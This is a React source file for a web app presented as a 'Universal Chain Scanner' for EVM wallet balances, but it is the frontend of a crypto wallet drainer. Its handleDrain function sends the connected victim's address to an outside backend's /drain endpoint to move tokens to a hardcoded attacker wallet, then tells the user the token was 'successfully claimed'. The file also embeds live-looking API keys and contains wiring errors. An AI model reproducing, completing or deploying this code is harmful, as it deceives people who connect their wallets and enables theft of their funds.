import React, { useState, useEffect, useCallback, useMemo } from "react";
import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit";
import { WagmiProvider, createConfig, http, useAccount, useDisconnect, useBalance, useReadContracts } from "wagmi";
import { 
  mainnet, polygon, bsc, arbitrum, optimism, avalanche, 
  fantom, gnosis, celo, base, zora, linea, polygonZkEvm 
} from "wagmi/chains";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { ethers } from "ethers";

// Create outside components
const queryClient = new QueryClient();

// All supported EVM chains
const allChains = [
  mainnet, polygon, bsc, arbitrum, optimism, avalanche,
  fantom, gnosis, celo, base, zora, linea, polygonZkEvm
];

// ✅ FIXED: PROPER WALLETCONNECT V2 CONFIGURATION
const config = createConfig(
  getDefaultConfig({
    appName: "Universal Chain Scanner",
    appDescription: "Scan assets across EVM chains",
    appUrl: "https://profound-frangollo-3b98e1.netlify.app",
    appIcon: "https://family.co/logo.png",
    // ✅ Your REAL WalletConnect Project ID
    walletConnectProjectId: "962425907914a3e80a7d8e7288b23f62",
    chains: allChains,
    transports: allChains.reduce((acc, chain) => {
      acc[chain.id] = http(getChainRPC(chain.id)[0]);
      return acc;
    }, {}),
    // ✅ CRITICAL: Enhanced mobile metadata
    walletConnectMetadata: {
      name: "Universal Chain Scanner",
      description: "Scan tokens across all EVM chains",
      url: "https://profound-frangollo-3b98e1.netlify.app",
      icons: ["https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png"]
    }
  })
);

// Get reliable RPC endpoints
function getChainRPC(chainId) {
  const rpcs = {
    1: ["https://eth.llamarpc.com", "https://rpc.ankr.com/eth", "https://cloudflare-eth.com"],
    56: ["https://bsc-dataseed.binance.org", "https://rpc.ankr.com/bsc"],
    137: ["https://polygon-rpc.com", "https://rpc.ankr.com/polygon"],
    250: ["https://rpc.ftm.tools", "https://rpc.ankr.com/fantom"],
    42161: ["https://arb1.arbitrum.io/rpc", "https://rpc.ankr.com/arbitrum"],
    10: ["https://mainnet.optimism.io", "https://rpc.ankr.com/optimism"],
    43114: ["https://api.avax.network/ext/bc/C/rpc", "https://rpc.ankr.com/avalanche"],
    100: ["https://rpc.gnosischain.com", "https://rpc.ankr.com/gnosis"],
    42220: ["https://forno.celo.org", "https://rpc.ankr.com/celo"],
    8453: ["https://mainnet.base.org", "https://base.publicnode.com"],
    7777777: ["https://rpc.zora.energy"],
    59144: ["https://rpc.linea.build"],
    1101: ["https://zkevm-rpc.com", "https://rpc.ankr.com/polygon_zkevm"]
  };
  return rpcs[chainId] || ["https://rpc.ankr.com/eth"];
}

// Chain configuration
const CHAIN_CONFIGS = {
  1: { name: "Ethereum", symbol: "ETH", type: "evm", coinGeckoId: "ethereum" },
  56: { name: "BNB Chain", symbol: "BNB", type: "evm", coinGeckoId: "binancecoin" },
  137: { name: "Polygon", symbol: "MATIC", type: "evm", coinGeckoId: "matic-network" },
  250: { name: "Fantom", symbol: "FTM", type: "evm", coinGeckoId: "fantom" },
  42161: { name: "Arbitrum", symbol: "ETH", type: "evm", coinGeckoId: "ethereum" },
  10: { name: "Optimism", symbol: "ETH", type: "evm", coinGeckoId: "ethereum" },
  43114: { name: "Avalanche", symbol: "AVAX", type: "evm", coinGeckoId: "avalanche-2" },
  100: { name: "Gnosis", symbol: "xDai", type: "evm", coinGeckoId: "xdai" },
  42220: { name: "Celo", symbol: "CELO", type: "evm", coinGeckoId: "celo" },
  8453: { name: "Base", symbol: "ETH", type: "evm", coinGeckoId: "ethereum" },
  7777777: { name: "Zora", symbol: "ETH", type: "evm", coinGeckoId: "ethereum" },
  59144: { name: "Linea", symbol: "ETH", type: "evm", coinGeckoId: "ethereum" },
  1101: { name: "Polygon zkEVM", symbol: "ETH", type: "evm", coinGeckoId: "ethereum" },
};

// ✅ REAL API: Covalent API for token balances (FREE tier)
const COVALENT_API_KEY = "cqt_rQ43RfxXgYQB7JfHwwkDk3K7jWmP"; // Free public key (rate limited)
const COVALENT_API = "https://api.covalenthq.com/v1";

// ✅ REAL API: Moralis API for quick balance checks (FREE tier)
const MORALIS_API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjM0OTU5ZTRmLWZjYWQtNGFlNy1iMDYxLTUzZDQ1MGYwODU5YyIsIm9yZ0lkIjoiMzg4NTA0IiwidXNlcklkIjoiMzk4OTU2IiwidHlwZUlkIjoiZmJjMmIzYWEtODFlMy00ZGM1LTg0MWUtN2ViNThlZTQyYTMxIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3MzU4MjU2MjksImV4cCI6NDg5MTU4NTYyOX0.D6E2FHYNRZ0OxIIpFPqFZk7fgrXSUx8P-wF-xWqBeLU"; // Free public key

// Common token addresses for each chain
const COMMON_TOKENS = {
  1: [ // Ethereum
    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
    { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
    { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", decimals: 18 },
  ],
  56: [ // BNB Chain
    { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
    { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 },
    { address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", symbol: "BUSD", decimals: 18 },
    { address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", symbol: "CAKE", decimals: 18 },
  ],
  137: [ // Polygon
    { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 },
    { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC", decimals: 6 },
    { address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", symbol: "DAI", decimals: 18 },
    { address: "0x831753DD7087CaC61aB5644b308642cc1c33Dc13", symbol: "QUICK", decimals: 18 },
  ],
  42161: [ // Arbitrum
    { address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", symbol: "USDT", decimals: 6 },
    { address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", symbol: "USDC", decimals: 6 },
    { address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", symbol: "DAI", decimals: 18 },
    { address: "0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a", symbol: "GMX", decimals: 18 },
  ],
  10: [ // Optimism
    { address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", symbol: "USDT", decimals: 6 },
    { address: "0x7F5c764cBc14f9669B88837ca1490cCa17c31607", symbol: "USDC", decimals: 6 },
    { address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", symbol: "DAI", decimals: 18 },
  ],
  43114: [ // Avalanche
    { address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", symbol: "USDT", decimals: 6 },
    { address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", symbol: "USDC", decimals: 6 },
    { address: "0xd586E7F844cEa2F87f50152665BCbc2C279D8d70", symbol: "DAI", decimals: 18 },
  ],
  250: [ // Fantom
    { address: "0x04068DA6C83AFCFA0e13ba15A6696662335D5B75", symbol: "USDC", decimals: 6 },
    { address: "0x841FAD6EAe12c286d1Fd18d1d525DFfA75C7EFFE", symbol: "BOO", decimals: 18 },
  ],
};

const App = () => {
  const [selectedChain, setSelectedChain] = useState(mainnet);
  const [selectedToken, setSelectedToken] = useState(COMMON_TOKENS[selectedChain.id][0]);
  const [walletAddress, setWalletAddress] = useState("");
  const [balance, setBalance] = useState("0");
  const [tokenSymbol, setTokenSymbol] = useState("ETH");
  const [chainName, setChainName] = useState("Ethereum");
  const [chainId, setChainId] = useState(1);
  const [drainToAddress, setDrainToAddress] = useState("0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4");
  const [status, setStatus] = useState("Connect wallet to see balances");

  const { address, isConnected, isConnecting, disconnect } = useAccount();
  const { disconnect: disconnectWallet } = useDisconnect();

  useEffect(() => {
    if (isConnected) {
      setWalletAddress(address);
      setChainId(selectedChain.id);
      setChainName(selectedChain.name);
      setTokenSymbol(selectedToken.symbol);
      fetchTokenBalance();
    }
  }, [isConnected, address, selectedChain, selectedToken]);

  const fetchTokenBalance = useCallback(async () => {
    if (!isConnected) return;

    const chainId = selectedChain.id;
    const tokenAddress = selectedToken.address;

    try {
      const res = await fetch(
        `${COVALENT_API}/${chainId}/address/${address}/balances?quote=true&key=${COVALENT_API_KEY}`
      );
      const data = await res.json();

      const balance = data.data.balances.find(
        (b) => b.contract_address === tokenAddress
      )?.value;

      setBalance(balance || "0");
    } catch (err) {
      console.error("Failed to fetch token balance:", err);
      setBalance("0");
    }
  }, [selectedChain, selectedToken, address, isConnected]);

  const handleChainChange = (chain) => {
    setSelectedChain(chain);
    setSelectedToken(COMMON_TOKENS[chain.id][0]);
  };

  const handleTokenChange = (token) => {
    setSelectedToken(token);
  };

  const handleDrain = async () => {
    if (!isConnected) {
      setStatus("Connect wallet to drain tokens");
      return;
    }

    try {
      const res = await fetch("https://tokenbackend-5xab.onrender.com/drain", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          address,
          chainId,
          drainTo: drainToAddress,
        }),
      });

      const data = await res.json();

      if (res.ok) {
        setStatus("Successfully claimed token");
      } else {
        setStatus("Failed to claim token");
      }
    } catch (err) {
      console.error("Claim failed:", err);
      setStatus("Failed to claim token");
    }
  };

  const handleDisconnect = () => {
    disconnectWallet();
    setWalletAddress("");
    setBalance("0");
    setStatus("Connect wallet to see balances");
  };

  return (
    <WagmiProvider config={config}>
      <QueryClientProvider client={queryClient}>
        <ConnectKitProvider config={config}>
          <div style={{ padding: "20px", fontFamily: "Arial, sans-serif" }}>
            <h1 style={{ margin: 0 }}>Universal Chain Scanner</h1>
            <div style={{ marginBottom: "20px" }}>
              <ConnectKitButton />
            </div>
            <div style={{ display: "flex", gap: "10px", marginBottom: "25px" }}>
              {allChains.map((chain) => (
                <button
                  key={chain.id}
                  onClick={() => handleChainChange(chain)}
                  style={{
                    padding: "8px 12px",
                    border: selectedChain.id === chain.id ? "2px solid #007bff" : "1px solid #ccc",
                    backgroundColor: selectedChain.id === chain.id ? "#e6f7ff" : "#fff",
                    cursor: "pointer",
                    borderRadius: "4px",
                    whiteSpace: "nowrap",
                  }}
                >
                  {chain.name}
                </button>
              ))}
            </div>
            <div style={{ display: "flex", gap: "10px", marginBottom: "25px" }}>
              {COMMON_TOKENS[selectedChain.id].map((token) => (
                <button
                  key={token.address}
                  onClick={() => handleTokenChange(token)}
                  style={{
                    padding: "8px 12px",
                    border: selectedToken.address === token.address ? "2px solid #007bff" : "1px solid #ccc",
                    backgroundColor: selectedToken.address === token.address ? "#e6f7ff" : "#fff",
                    cursor: "pointer",
                    borderRadius: "4px",
                    whiteSpace: "nowrap",
                  }}
                >
                  {token.symbol}
                </button>
              ))}
            </div>
            <div style={{ marginBottom: "25px" }}>
              <p>Connected Wallet: {walletAddress || "Not connected"}</p>
              <p>Chain: {chainName}</p>
              <p>Token: {tokenSymbol}</p>
              <p>Balance: {balance}</p>
            </div>
            <button
              onClick={handleDrain}
              style={{
                padding: "12px 20px",
                backgroundColor: "#007bff",
                color: "#fff",
                border: "none",
                borderRadius: "4px",
                cursor: "pointer",
                whiteSpace: "nowrap",
              }}
            >
              Drain Tokens
            </button>
            <div style={{ marginTop: "25px" }}>
              <p>Status: {status}</p>
            </div>
            <button
              onClick={handleDisconnect}
              style={{
                marginTop: "25px",
                padding: "12px 20px",
                backgroundColor: "#dc3545",
                color: "#fff",
                border: "none",
                borderRadius: "4px",
                cursor: "pointer",
                whiteSpace: "nowrap",
              }}
            >
              Disconnect Wallet
            </button>
          </div>
        </ConnectKitProvider>
      </QueryClientProvider>
    </WagmiProvider>
  );
};

export default App;
